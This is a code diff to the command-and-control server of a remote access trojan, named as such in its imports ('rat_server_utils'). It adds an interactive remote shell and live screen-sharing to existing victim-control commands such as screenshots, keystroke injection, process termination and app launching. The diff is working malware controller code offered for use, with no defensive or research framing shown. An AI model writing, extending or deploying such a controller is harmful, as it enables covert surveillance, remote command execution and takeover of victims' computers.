@@ -3,7 +3,7 @@ import time
 import socket
 import colorama # type: ignore
 from colorama import Fore, Style # type: ignore
-from modules.rat_server_utils import clear_screen, handle_client_disconnect, receive_screenshot, show_client_commands
+from modules.rat_server_utils import clear_screen, handle_client_disconnect, receive_screenshot, receive_screen_share, show_client_commands
 from modules.server_ui_utils import print_banner
 from modules.server_formatings import (
     format_network_info, 
@@ -31,7 +31,8 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
     valid_commands = [
         "back", "help", "clear", "kill", "exit", "screenshot", "sysinfo", "netinfo", 
         "list_processes", "search_process", "terminate_process", "send_keys", 
-        "system_logs", "installed_software", "launch_app"
+        "system_logs", "installed_software", "launch_app", "shell", 
+        "start_screen_share", "stop_screen_share"
     ]
     
     # Function to check if a command is valid
@@ -85,6 +86,25 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
                 continue
             
             if command.lower() == "clear":
+                clear_screen()
+                print_banner()
+                print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Type 'back' to return to main menu or 'exit' to disconnect client{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
+                print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")
+                continue
+                
+            if command.lower() == "shell":
+                # Import the interactive shell module
+                from modules.interactive_shell import interactive_shell_session
+                
+                # Start interactive shell session
+                try:
+                    interactive_shell_session(client_sockets[active_client], buffer_size)
+                except Exception as e:
+                    print(f"{Fore.RED}Error in interactive shell session: {str(e)}{Style.RESET_ALL}")
+                    
+                # Refresh the client command interface after shell session ends
                 clear_screen()
                 print_banner()
                 print(f"{Fore.CYAN}=== CLIENT COMMAND MODE - Client {active_client} ==={Style.RESET_ALL}")
@@ -151,6 +171,58 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
                         print(f"{Fore.RED}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}")
                 except:
                     print(f"{Fore.RED}Error sending screenshot command{Style.RESET_ALL}")
+                    active_client = handle_client_disconnect_wrapper_local(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            elif command.lower() == "start_screen_share":
+                try:
+                    client_sockets[active_client].send("start_screen_share".encode())
+                    print(f"{Fore.CYAN}Starting screen sharing with client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Wait for confirmation from client (text response)
+                    client_sockets[active_client].settimeout(10.0)
+                    try:
+                        # Receive the text confirmation first
+                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
+                        print(f"{Fore.GREEN}Client response: {response}{Style.RESET_ALL}")
+                        
+                        if "successfully" in response.lower():
+                            print(f"{Fore.CYAN}Screen sharing confirmed, waiting for stream...{Style.RESET_ALL}")
+                            # Start receiving screen share stream (binary data)
+                            success = receive_screen_share(client_sockets[active_client], buffer_size)
+                            if success:
+                                print(f"{Fore.GREEN}Screen sharing session completed{Style.RESET_ALL}")
+                            else:
+                                print(f"{Fore.RED}Screen sharing session failed{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.RED}Failed to start screen sharing: {response}{Style.RESET_ALL}")
+                    except socket.timeout:
+                        print(f"{Fore.RED}Timeout waiting for screen sharing response{Style.RESET_ALL}")
+                    
+                    client_sockets[active_client].settimeout(None)
+                except Exception as e:
+                    print(f"{Fore.RED}Error starting screen sharing: {str(e)}{Style.RESET_ALL}")
+                    active_client = handle_client_disconnect_wrapper_local(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            elif command.lower() == "stop_screen_share":
+                try:
+                    client_sockets[active_client].send("stop_screen_share".encode())
+                    print(f"{Fore.CYAN}Stopping screen sharing with client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Wait for confirmation from client
+                    client_sockets[active_client].settimeout(5.0)
+                    try:
+                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
+                        print(f"{Fore.GREEN}Client response: {response}{Style.RESET_ALL}")
+                    except socket.timeout:
+                        print(f"{Fore.YELLOW}No response from client (screen sharing may already be stopped){Style.RESET_ALL}")
+                    
+                    client_sockets[active_client].settimeout(None)
+                except Exception as e:
+                    print(f"{Fore.RED}Error stopping screen sharing: {str(e)}{Style.RESET_ALL}")
                     active_client = handle_client_disconnect_wrapper_local(active_client)
                     input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                     break
